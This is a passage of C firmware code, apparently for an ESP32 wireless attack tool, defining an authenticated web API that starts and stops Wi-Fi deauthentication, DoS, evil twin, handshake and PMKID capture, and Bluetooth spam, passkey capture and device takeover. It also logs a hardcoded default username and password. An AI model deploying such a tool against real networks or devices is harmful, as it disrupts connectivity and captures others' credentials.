    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_l2cap_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_l2cap_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_l2cap_stop();
    return send_success_response(req);
}

static esp_err_t ble_gatt_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_gatt_probe_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_gatt_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_gatt_probe_stop();
    return send_success_response(req);
}

static esp_err_t ble_deauth_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_deauth_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_deauth_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_deauth_stop();
    return send_success_response(req);
}

/* ============ BLE PASSKEY HANDLERS ============ */

static esp_err_t ble_passkey_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_passkey_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_passkey_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_passkey_stop();
    return send_success_response(req);
}

static esp_err_t ble_passkey_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ble_passkey_get_info());
    return ESP_OK;
}

/* ============ BLE TAKEOVER HANDLERS ============ */

static esp_err_t ble_takeover_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_takeover_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_takeover_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_takeover_stop();
    return send_success_response(req);
}

static esp_err_t ble_takeover_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ble_takeover_get_status());
    return ESP_OK;
}

static esp_err_t ble_takeover_services_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ble_takeover_get_services_json());
    return ESP_OK;
}

static esp_err_t ble_takeover_read_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[128];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *handle_json = cJSON_GetObjectItem(root, "handle");
    if (!cJSON_IsNumber(handle_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing handle");
        return ESP_FAIL;
    }
    ble_takeover_read_chr((uint16_t)handle_json->valueint);
    cJSON_Delete(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ble_takeover_get_read_result());
    return ESP_OK;
}

static esp_err_t ble_takeover_write_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[512];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *handle_json = cJSON_GetObjectItem(root, "handle");
    cJSON *value_json = cJSON_GetObjectItem(root, "value");
    if (!cJSON_IsNumber(handle_json) || !cJSON_IsString(value_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing handle or value");
        return ESP_FAIL;
    }
    bool ok = ble_takeover_write_chr((uint16_t)handle_json->valueint, value_json->valuestring);
    cJSON_Delete(root);
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ble_takeover_notify_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[128];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *handle_json = cJSON_GetObjectItem(root, "handle");
    cJSON *enable_json = cJSON_GetObjectItem(root, "enable");
    if (!cJSON_IsNumber(handle_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing handle");
        return ESP_FAIL;
    }
    bool enable = cJSON_IsBool(enable_json) ? enable_json->valueint : true;
    bool ok = ble_takeover_enable_notify((uint16_t)handle_json->valueint, enable);
    cJSON_Delete(root);
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ble_takeover_notifs_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ble_takeover_get_notifications_json());
    return ESP_OK;
}

static esp_err_t ble_scan_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *result = ble_scan_perform(5000);
    if (result == NULL) result = cJSON_CreateArray();
    return send_json_response(req, result);
}

static esp_err_t ble_status_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *response = cJSON_CreateObject();
    if (response == NULL) {
        return send_json_response(req, response);
    }
    cJSON_AddBoolToObject(response, "running", attack_bt_spam_is_running());
    return send_json_response(req, response);
}

static esp_err_t stop_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_timer_active = false;
    stop_deauth_attack();
    attack_bt_spam_stop();
    return send_success_response(req);
}

static esp_err_t status_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    cJSON *response = cJSON_CreateObject();
    if (response == NULL) {
        return send_json_response(req, response);
    }
    cJSON_AddBoolToObject(response, "attacking", is_attack_active());
    cJSON_AddBoolToObject(response, "ble_running", attack_bt_spam_is_running());
    cJSON_AddBoolToObject(response, "ble_deauth_running", ble_deauth_is_running());
    cJSON_AddBoolToObject(response, "ble_connect_running", ble_connect_flood_is_running());
    cJSON_AddBoolToObject(response, "ble_l2cap_running", ble_l2cap_is_running());
    cJSON_AddBoolToObject(response, "ble_passkey_running", ble_passkey_is_running());
    cJSON_AddBoolToObject(response, "ble_takeover_running", ble_takeover_is_running());
    if (attack_bt_spam_is_running()) {
        cJSON_AddStringToObject(response, "bluetooth", "BLE spam active");
    }
    if (ble_deauth_is_running()) {
        cJSON_AddStringToObject(response, "ble_deauth", "BLE deauth active");
    }
    if (ble_passkey_is_running()) {
        cJSON_AddStringToObject(response, "ble_passkey", "BLE passkey capture active");
    }
    if (ble_takeover_is_running()) {
        cJSON_AddStringToObject(response, "ble_takeover", "BLE device takeover active");
    }
    if (is_attack_active()) {
        char target[18];
        get_attack_target(target);
        cJSON_AddStringToObject(response, "target", target);
        if (attack_timer_active) {
            int elapsed = time(NULL) - attack_start_time;
            int remaining = (attack_duration_minutes * 60) - elapsed;
            if (remaining > 0) cJSON_AddNumberToObject(response, "remaining", remaining);
        }
    }
    return send_json_response(req, response);
}

static esp_err_t detector_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    const deauth_detector_status_t *status = deauth_detector_get_status();
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) {
        return send_json_response(req, root);
    }
    cJSON_AddBoolToObject(root, "running", status->running);
    cJSON_AddNumberToObject(root, "tracked_bssids", status->count);
    cJSON *alerts = cJSON_CreateArray();
    if (alerts == NULL) {
        cJSON_Delete(root);
        return send_json_response(req, NULL);
    }
    for (int i = 0; i < status->count; i++) {
        if (status->entries[i].alerting) {
            cJSON *alert = cJSON_CreateObject();
            if (alert == NULL) {
                cJSON_Delete(root);
                return send_json_response(req, NULL);
            }
            char bssid_str[18];
            snprintf(bssid_str, sizeof(bssid_str), MACSTR, MAC2STR(status->entries[i].bssid));
            cJSON_AddStringToObject(alert, "bssid", bssid_str);
            cJSON_AddNumberToObject(alert, "count", status->entries[i].count);
            cJSON_AddItemToArray(alerts, alert);
        }
    }
    cJSON_AddItemToObject(root, "alerts", alerts);
    return send_json_response(req, root);
}

static esp_err_t dos_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    cJSON *method_json = cJSON_GetObjectItem(root, "method");
    
    if (!fill_ap_record_from_json(root, &dos_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    attack_config_t attack_config = {0};
    attack_config.target_count = 1;
    attack_config.ap_records[0] = &dos_target;
    int dos_method = cJSON_IsNumber(method_json) ? method_json->valueint : ATTACK_DOS_METHOD_BROADCAST;
    if (dos_method < ATTACK_DOS_METHOD_ROGUE_AP || dos_method > ATTACK_DOS_METHOD_SUPER_CLONE) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid method");
        return ESP_FAIL;
    }
    attack_config.method = dos_method;
    
    ESP_LOGI(TAG, "Starting DoS attack with method: %d", attack_config.method);
    attack_dos_start(&attack_config);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t handshake_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    cJSON *method_json = cJSON_GetObjectItem(root, "method");
    
    if (!fill_ap_record_from_json(root, &handshake_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    attack_config_t attack_config = {0};
    attack_config.target_count = 1;
    attack_config.ap_records[0] = &handshake_target;
    int handshake_method = cJSON_IsNumber(method_json) ? method_json->valueint : ATTACK_HANDSHAKE_METHOD_BROADCAST;
    if (handshake_method < ATTACK_HANDSHAKE_METHOD_ROGUE_AP || handshake_method > ATTACK_HANDSHAKE_METHOD_PASSIVE) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid method");
        return ESP_FAIL;
    }
    attack_config.method = handshake_method;
    
    ESP_LOGI(TAG, "Starting Handshake capture with method: %d", attack_config.method);
    attack_handshake_start(&attack_config);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t pmkid_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    if (!fill_ap_record_from_json(root, &pmkid_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    attack_config_t attack_config = {0};
    attack_config.target_count = 1;
    attack_config.ap_records[0] = &pmkid_target;
    
    ESP_LOGI(TAG, "Starting PMKID attack");
    attack_pmkid_start(&attack_config);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t probe_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    ESP_LOGI(TAG, "Starting Probe Sniffer");
    attack_probe_start(NULL);

    return send_success_response(req);
}

static esp_err_t eviltwin_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    if (!fill_ap_record_from_json(root, &evil_twin_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    ESP_LOGI(TAG, "Starting Evil Twin attack on SSID: %s", evil_twin_target.ssid);
    attack_method_evil_twin(&evil_twin_target);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t stop_all_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_timer_active = false;
    stop_deauth_attack();
    attack_beacon_spam_stop();
    attack_dos_stop();
    attack_handshake_stop();
    attack_pmkid_stop();
    attack_probe_stop();
    attack_bt_spam_stop();
    attack_method_evil_twin_stop();
    ble_deauth_stop();
    ble_connect_flood_stop();
    ble_l2cap_stop();
    ble_gatt_probe_stop();
    ble_spoof_stop();
    ble_passkey_stop();
    ble_takeover_stop();

    return send_success_response(req);
}

void start_web_server(void) {
    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.lru_purge_enable = true;
    config.max_uri_handlers = 60;
    config.recv_wait_timeout = 10;
    
    if (httpd_start(&server, &config) == ESP_OK) {
        server_handle = server;
        httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = root_handler };
        httpd_register_uri_handler(server, &root);
        httpd_uri_t login = { .uri = "/login", .method = HTTP_GET, .handler = login_handler };
        httpd_register_uri_handler(server, &login);
        httpd_uri_t login_post = { .uri = "/login", .method = HTTP_POST, .handler = login_post_handler };
        httpd_register_uri_handler(server, &login_post);
        httpd_uri_t dashboard = { .uri = "/dashboard", .method = HTTP_GET, .handler = dashboard_handler };
        httpd_register_uri_handler(server, &dashboard);
        httpd_uri_t logout = { .uri = "/logout", .method = HTTP_GET, .handler = logout_handler };
        httpd_register_uri_handler(server, &logout);
        httpd_uri_t scan = { .uri = "/api/scan", .method = HTTP_GET, .handler = scan_api_handler };
        httpd_register_uri_handler(server, &scan);
        httpd_uri_t mgmt_ap_get = { .uri = "/api/mgmt-ap", .method = HTTP_GET, .handler = mgmt_ap_get_handler };
        httpd_register_uri_handler(server, &mgmt_ap_get);
        httpd_uri_t mgmt_ap_set = { .uri = "/api/mgmt-ap", .method = HTTP_POST, .handler = mgmt_ap_set_handler };
        httpd_register_uri_handler(server, &mgmt_ap_set);
        httpd_uri_t mgmt_ap_reset = { .uri = "/api/mgmt-ap/reset", .method = HTTP_POST, .handler = mgmt_ap_reset_handler };
        httpd_register_uri_handler(server, &mgmt_ap_reset);
        httpd_uri_t attack = { .uri = "/api/attack", .method = HTTP_POST, .handler = attack_api_handler };
        httpd_register_uri_handler(server, &attack);
        httpd_uri_t stop = { .uri = "/api/stop", .method = HTTP_POST, .handler = stop_api_handler };
        httpd_register_uri_handler(server, &stop);
        httpd_uri_t status = { .uri = "/api/status", .method = HTTP_GET, .handler = status_api_handler };
        httpd_register_uri_handler(server, &status);
        httpd_uri_t detector = { .uri = "/api/detector", .method = HTTP_GET, .handler = detector_api_handler };
        httpd_register_uri_handler(server, &detector);
        httpd_uri_t beacon_start = { .uri = "/api/beacon/start", .method = HTTP_POST, .handler = beacon_start_handler };
        httpd_register_uri_handler(server, &beacon_start);
        httpd_uri_t beacon_stop = { .uri = "/api/beacon/stop", .method = HTTP_POST, .handler = beacon_stop_handler };
        httpd_register_uri_handler(server, &beacon_stop);
        httpd_uri_t dos_start = { .uri = "/api/dos/start", .method = HTTP_POST, .handler = dos_start_handler };
        httpd_register_uri_handler(server, &dos_start);
        httpd_uri_t handshake_start = { .uri = "/api/handshake/start", .method = HTTP_POST, .handler = handshake_start_handler };
        httpd_register_uri_handler(server, &handshake_start);
        httpd_uri_t pmkid_start = { .uri = "/api/pmkid/start", .method = HTTP_POST, .handler = pmkid_start_handler };
        httpd_register_uri_handler(server, &pmkid_start);
        httpd_uri_t probe_start = { .uri = "/api/probe/start", .method = HTTP_POST, .handler = probe_start_handler };
        httpd_register_uri_handler(server, &probe_start);
        httpd_uri_t eviltwin_start = { .uri = "/api/eviltwin/start", .method = HTTP_POST, .handler = eviltwin_start_handler };
        httpd_register_uri_handler(server, &eviltwin_start);
        httpd_uri_t ble_scan_uri = { .uri = "/api/ble/scan", .method = HTTP_GET, .handler = ble_scan_api_handler };
        httpd_register_uri_handler(server, &ble_scan_uri);
        httpd_uri_t ble_status_uri = { .uri = "/api/ble/status", .method = HTTP_GET, .handler = ble_status_api_handler };
        httpd_register_uri_handler(server, &ble_status_uri);
        httpd_uri_t ble_spam_start_uri = { .uri = "/api/ble/spam/start", .method = HTTP_POST, .handler = ble_spam_start_handler };
        httpd_register_uri_handler(server, &ble_spam_start_uri);
        httpd_uri_t ble_spam_stop_uri = { .uri = "/api/ble/spam/stop", .method = HTTP_POST, .handler = ble_spam_stop_handler };
        httpd_register_uri_handler(server, &ble_spam_stop_uri);
        httpd_uri_t ble_spoof_start_uri = { .uri = "/api/ble/spoof/start", .method = HTTP_POST, .handler = ble_spoof_start_handler };
        httpd_register_uri_handler(server, &ble_spoof_start_uri);
        httpd_uri_t ble_spoof_stop_uri = { .uri = "/api/ble/spoof/stop", .method = HTTP_POST, .handler = ble_spoof_stop_handler };
        httpd_register_uri_handler(server, &ble_spoof_stop_uri);
        httpd_uri_t ble_connect_start_uri = { .uri = "/api/ble/connect/start", .method = HTTP_POST, .handler = ble_connect_start_handler };
        httpd_register_uri_handler(server, &ble_connect_start_uri);
        httpd_uri_t ble_connect_stop_uri = { .uri = "/api/ble/connect/stop", .method = HTTP_POST, .handler = ble_connect_stop_handler };
        httpd_register_uri_handler(server, &ble_connect_stop_uri);
        httpd_uri_t ble_l2cap_start_uri = { .uri = "/api/ble/l2cap/start", .method = HTTP_POST, .handler = ble_l2cap_start_handler };
        httpd_register_uri_handler(server, &ble_l2cap_start_uri);
        httpd_uri_t ble_l2cap_stop_uri = { .uri = "/api/ble/l2cap/stop", .method = HTTP_POST, .handler = ble_l2cap_stop_handler };
        httpd_register_uri_handler(server, &ble_l2cap_stop_uri);
        httpd_uri_t ble_gatt_start_uri = { .uri = "/api/ble/gatt/start", .method = HTTP_POST, .handler = ble_gatt_start_handler };
        httpd_register_uri_handler(server, &ble_gatt_start_uri);
        httpd_uri_t ble_gatt_stop_uri = { .uri = "/api/ble/gatt/stop", .method = HTTP_POST, .handler = ble_gatt_stop_handler };
        httpd_register_uri_handler(server, &ble_gatt_stop_uri);
        httpd_uri_t ble_deauth_start_uri = { .uri = "/api/ble/deauth/start", .method = HTTP_POST, .handler = ble_deauth_start_handler };
        httpd_register_uri_handler(server, &ble_deauth_start_uri);
        httpd_uri_t ble_deauth_stop_uri = { .uri = "/api/ble/deauth/stop", .method = HTTP_POST, .handler = ble_deauth_stop_handler };
        httpd_register_uri_handler(server, &ble_deauth_stop_uri);
        httpd_uri_t ble_passkey_start_uri = { .uri = "/api/ble/passkey/start", .method = HTTP_POST, .handler = ble_passkey_start_handler };
        httpd_register_uri_handler(server, &ble_passkey_start_uri);
        httpd_uri_t ble_passkey_stop_uri = { .uri = "/api/ble/passkey/stop", .method = HTTP_POST, .handler = ble_passkey_stop_handler };
        httpd_register_uri_handler(server, &ble_passkey_stop_uri);
        httpd_uri_t ble_passkey_status_uri = { .uri = "/api/ble/passkey/status", .method = HTTP_GET, .handler = ble_passkey_status_handler };
        httpd_register_uri_handler(server, &ble_passkey_status_uri);
        httpd_uri_t ble_takeover_start_uri = { .uri = "/api/ble/takeover/start", .method = HTTP_POST, .handler = ble_takeover_start_handler };
        httpd_register_uri_handler(server, &ble_takeover_start_uri);
        httpd_uri_t ble_takeover_stop_uri = { .uri = "/api/ble/takeover/stop", .method = HTTP_POST, .handler = ble_takeover_stop_handler };
        httpd_register_uri_handler(server, &ble_takeover_stop_uri);
        httpd_uri_t ble_takeover_status_uri = { .uri = "/api/ble/takeover/status", .method = HTTP_GET, .handler = ble_takeover_status_handler };
        httpd_register_uri_handler(server, &ble_takeover_status_uri);
        httpd_uri_t ble_takeover_services_uri = { .uri = "/api/ble/takeover/services", .method = HTTP_GET, .handler = ble_takeover_services_handler };
        httpd_register_uri_handler(server, &ble_takeover_services_uri);
        httpd_uri_t ble_takeover_read_uri = { .uri = "/api/ble/takeover/read", .method = HTTP_POST, .handler = ble_takeover_read_handler };
        httpd_register_uri_handler(server, &ble_takeover_read_uri);
        httpd_uri_t ble_takeover_write_uri = { .uri = "/api/ble/takeover/write", .method = HTTP_POST, .handler = ble_takeover_write_handler };
        httpd_register_uri_handler(server, &ble_takeover_write_uri);
        httpd_uri_t ble_takeover_notify_uri = { .uri = "/api/ble/takeover/notify", .method = HTTP_POST, .handler = ble_takeover_notify_handler };
        httpd_register_uri_handler(server, &ble_takeover_notify_uri);
        httpd_uri_t ble_takeover_notifs_uri = { .uri = "/api/ble/takeover/notifs", .method = HTTP_GET, .handler = ble_takeover_notifs_handler };
        httpd_register_uri_handler(server, &ble_takeover_notifs_uri);
        httpd_uri_t stop_all = { .uri = "/api/stop/all", .method = HTTP_POST, .handler = stop_all_handler };
        httpd_register_uri_handler(server, &stop_all);
        
        ESP_LOGI(TAG, "==========================================");
        ESP_LOGI(TAG, "Omega Solutions - Complete Security Suite v4.0");
        ESP_LOGI(TAG, "Web server started! Open http://192.168.4.1");
        ESP_LOGI(TAG, "Username: omega | Password: solutions123");
        ESP_LOGI(TAG, "Available Attacks: Deauth, Beacon, DoS, Handshake, PMKID, Probe, EvilTwin, BLE Spam, BLE Deauth, BLE Passkey, BLE Takeover");
        ESP_LOGI(TAG, "==========================================");
    }
}

void webserver_stop(void) {
    if (server_handle != NULL) {
        httpd_stop(server_handle);
        server_handle = NULL;
        ESP_LOGI(TAG, "Web server stopped.");
    }
}

void webserver_run(void) {
    if (server_handle == NULL) {
        start_web_server();
    }
}
